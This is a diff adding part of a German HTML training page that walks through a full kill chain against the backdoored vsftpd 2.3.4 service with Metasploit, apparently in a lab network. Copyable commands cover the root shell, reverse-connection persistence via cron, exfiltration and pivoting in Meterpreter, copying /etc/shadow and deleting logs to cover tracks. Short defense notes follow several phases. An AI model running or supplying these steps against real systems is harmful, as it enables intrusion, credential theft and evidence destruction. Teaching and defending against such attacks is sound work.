+                                        <h4>Metasploit Framework vorbereiten</h4>
+                                        <div class="code-block">
+                                            <code>msfconsole
+search vsftpd_234_backdoor
+use exploit/unix/ftp/vsftpd_234_backdoor</code>
+                                            <button class="copy-btn" data-copy="msfconsole">Kopieren</button>
+                                        </div>
+                                        <p><strong>Zweck:</strong> Modul-Infos belegen, dass beim Login-String ':)' die Backdoor auf 6200/TCP öffnet.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Phase 3: Delivery -->
+                        <div class="walkthrough-phase">
+                            <div class="phase-number">3</div>
+                            <div class="card matrix-card">
+                                <div class="card__body">
+                                    <h3>📨 Delivery</h3>
+                                    <p><strong>Ziel:</strong> Exploit zustellen</p>
+                                    
+                                    <div class="walkthrough-step">
+                                        <h4>Exploit konfigurieren und ausführen</h4>
+                                        <div class="code-block">
+                                            <code>set RHOSTS 192.168.56.101
+set RPORT 21
+exploit</code>
+                                            <button class="copy-btn" data-copy="set RHOSTS 192.168.56.101">Kopieren</button>
+                                        </div>
+                                        <p><strong>Zweck:</strong> Da es sich um einen Remote-Dienst handelt, erfolgt die 'Lieferung' direkt über die Netzwerkverbindung.</p>
+                                        
+                                        <div class="output-block">
+                                            <h5>📟 Erwartete Ausgabe:</h5>
+                                            <div class="code-block">
+                                                <code>[*] 220 (vsFTPd 2.3.4)
+[*] Backdoor service has been spawned, handling...</code>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Phase 4: Exploitation -->
+                        <div class="walkthrough-phase">
+                            <div class="phase-number">4</div>
+                            <div class="card matrix-card">
+                                <div class="card__body">
+                                    <h3>💥 Exploitation</h3>
+                                    <p><strong>Ziel:</strong> Code-Ausführung erreichen</p>
+                                    
+                                    <div class="walkthrough-step">
+                                        <h4>Root-Shell erhalten</h4>
+                                        <div class="code-block">
+                                            <code>id</code>
+                                            <button class="copy-btn" data-copy="id">Kopieren</button>
+                                        </div>
+                                        <p><strong>Zweck:</strong> Metasploit öffnet eine Shell als root. Ursache: Hartkodierte Backdoor im kompromittierten Quell-Tarball von 2011.</p>
+                                        
+                                        <div class="output-block">
+                                            <h5>📟 Erwartete Ausgabe:</h5>
+                                            <div class="code-block">
+                                                <code>uid=0(root) gid=0(root) groups=0(root)</code>
+                                            </div>
+                                        </div>
+                                        
+                                        <div class="status status--error">
+                                            <strong>🎯 ERFOLG:</strong> Root-Berechtigung erreicht! System kompromittiert.
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Phase 5: Installation -->
+                        <div class="walkthrough-phase">
+                            <div class="phase-number">5</div>
+                            <div class="card matrix-card">
+                                <div class="card__body">
+                                    <h3>⚙️ Installation</h3>
+                                    <p><strong>Ziel:</strong> Persistenz schaffen</p>
+                                    
+                                    <div class="walkthrough-step">
+                                        <h4>Schritt 1: Reverse-Meterpreter nachladen</h4>
+                                        <div class="code-block">
+                                            <code>sessions -u -1</code>
+                                            <button class="copy-btn" data-copy="sessions -u -1">Kopieren</button>
+                                        </div>
+                                        <p><strong>Zweck:</strong> Shell → Meterpreter up-/downgrade für erweiterte Funktionen</p>
+                                    </div>
+
+                                    <div class="walkthrough-step">
+                                        <h4>Schritt 2: Persistenter Zugang via Cron</h4>
+                                        <div class="code-block">
+                                            <code>run persistence -U -i 60 -p 4444 -r 192.168.56.1</code>
+                                            <button class="copy-btn" data-copy="run persistence -U -i 60 -p 4444 -r 192.168.56.1">Kopieren</button>
+                                        </div>
+                                        <p><strong>Zweck:</strong> Legt Cron-Job an, der alle 60s einen Reverse-TCP startet.</p>
+                                    </div>
+
+                                    <div class="defense-note">
+                                        <h4>🛡️ Verteidigung</h4>
+                                        <p>Datei-Integritätsmonitoring für /var/spool/cron & /etc/cron.* aktivieren. Root-Dateisystem per Auditd/Sysmon überwachen.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Phase 6: Command & Control -->
+                        <div class="walkthrough-phase">
+                            <div class="phase-number">6</div>
+                            <div class="card matrix-card">
+                                <div class="card__body">
+                                    <h3>📡 Command & Control</h3>
+                                    <p><strong>Ziel:</strong> Sitzung dauerhaft steuern</p>
+                                    
+                                    <div class="walkthrough-step">
+                                        <h4>Meterpreter-Kommandos</h4>
+                                        <div class="command-grid">
+                                            <div class="command-item">
+                                                <div class="code-block">
+                                                    <code>sysinfo</code>
+                                                    <button class="copy-btn" data-copy="sysinfo">Kopieren</button>
+                                                </div>
+                                                <p><strong>Zweck:</strong> OS-Details anzeigen</p>
+                                            </div>
+                                            
+                                            <div class="command-item">
+                                                <div class="code-block">
+                                                    <code>getuid</code>
+                                                    <button class="copy-btn" data-copy="getuid">Kopieren</button>
+                                                </div>
+                                                <p><strong>Zweck:</strong> Effektiver Benutzer (root)</p>
+                                            </div>
+                                            
+                                            <div class="command-item">
+                                                <div class="code-block">
+                                                    <code>upload /path/to/file /tmp/
+download /etc/passwd /tmp/</code>
+                                                    <button class="copy-btn" data-copy="upload /path/to/file /tmp/">Kopieren</button>
+                                                </div>
+                                                <p><strong>Zweck:</strong> Daten ex-/infiltrieren</p>
+                                            </div>
+                                            
+                                            <div class="command-item">
+                                                <div class="code-block">
+                                                    <code>portfwd add -l 3389 -p 3389 -r 192.168.1.10</code>
+                                                    <button class="copy-btn" data-copy="portfwd add -l 3389 -p 3389 -r 192.168.1.10">Kopieren</button>
+                                                </div>
+                                                <p><strong>Zweck:</strong> Pivoting ins interne Netz</p>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div class="defense-note">
+                                        <h4>🛡️ Verteidigung</h4>
+                                        <p>Outbound-Traffic zu unbekannten IPs/Ports (z.B. 4444 TCP) blockieren & alarmieren.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Phase 7: Actions on Objectives -->
+                        <div class="walkthrough-phase">
+                            <div class="phase-number">7</div>
+                            <div class="card matrix-card">
+                                <div class="card__body">
+                                    <h3>🎯 Actions on Objectives</h3>
+                                    <p><strong>Ziel:</strong> Privilege Escalation & Datenzugriff</p>
+                                    
+                                    <div class="walkthrough-step">
+                                        <h4>Beweis für Systemkontrolle</h4>
+                                        <div class="code-block">
+                                            <code>cat /root/.bash_history
+cp /etc/shadow /tmp/shadow.bak</code>
+                                            <button class="copy-btn" data-copy="cat /root/.bash_history">Kopieren</button>
+                                        </div>
+                                        <p><strong>Zweck:</strong> Da wir bereits root sind, können wir direkt auf alle sensiblen Dateien zugreifen.</p>
+                                    </div>
+
+                                    <div class="walkthrough-step">
+                                        <h4>Spurverwischung</h4>
+                                        <div class="code-block">
+                                            <code>history -c
+rm /var/log/*.{log,old}</code>
+                                            <button class="copy-btn" data-copy="history -c">Kopieren</button>
+                                        </div>
+                                        <p><strong>Zweck:</strong> Entfernung von Spuren der Aktivität für forensische Verschleierung.</p>
+                                    </div>
+
+                                    <div class="additional-actions">
+                                        <h4>🔀 Erweiterte Aktionen</h4>
+                                        <p><strong>Seitliche Bewegung:</strong> Samba-Shares auf 139/445 mit validen root-Hashes mounten. Interne Datenbanken (MySQL 3306) dumpen.</p>
+                                        <div class="code-block">
+                                            <code># MySQL Root-Zugang (kein Passwort)
+mysql -u root -h localhost
+
+# Datenbank-Dumps erstellen
+mysqldump --all-databases > /tmp/db_dump.sql
+
+# SMB-Shares erkunden
+smbclient -L //192.168.56.101 -U root</code>
+                                            <button class="copy-btn" data-copy="mysql -u root -h localhost">Kopieren</button>
+                                        </div>
+                                    </div>
+
+                                    <div class="defense-note">
+                                        <h4>🛡️ Verteidigung</h4>
+                                        <p>Immutable-Logs (z.B. remote syslog) einsetzen. Filebeat/Wazuh zur Echtzeit-Log-Weiterleitung implementieren.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Zusammenfassung -->
+                    <div class="card matrix-card walkthrough-summary">
+                        <div class="card__body">
+                            <h3>📊 Kill-Chain Zusammenfassung</h3>
+                            <p>Dieser VSFTPD-Walkthrough demonstriert eine vollständige Cyber Kill Chain:</p>
+                            <div class="summary-grid">
+                                <div class="summary-item">
+                                    <h4>🎯 Angriffserfolg</h4>
+                                    <ul>
+                                        <li>✅ Root-Shell in < 5 Minuten</li>
+                                        <li>✅ Persistenz etabliert</li>
+                                        <li>✅ Vollständige Systemkontrolle</li>
+                                        <li>✅ Datenexfiltration möglich</li>
+                                    </ul>
+                                </div>
+                                <div class="summary-item">
+                                    <h4>💡 Lerneffekte</h4>
+                                    <ul>
+                                        <li>Systematisches Vorgehen nach Kill Chain</li>
+                                        <li>Reconnaissance ist der Schlüssel</li>
+                                        <li>Veraltete Software = kritisches Risiko</li>
+                                        <li>Defense-in-Depth Ansatz notwendig</li>
+                                    </ul>
+                                </div>
+                            </div>
+                            
+                            <div class="status status--error">
+                                <strong>⚠️ Realitätsbezug:</strong> Dieser Angriff funktioniert 1:1 in der Praxis und zeigt, warum regelmäßige Sicherheitsupdates überlebenswichtig sind!
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- Search Overlay -->
+        <div id="searchOverlay" class="search-overlay hidden">
+            <div class="search-overlay__content">
+                <div class="search-box">
+                    <input type="text" id="searchInput" placeholder="Suche nach Exploits, Tools, Commands..." class="form-control">
+                    <button id="closeSearch" class="btn btn--outline">ESC</button>
+                </div>
+                <div id="searchResults" class="search-results"></div>
+            </div>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
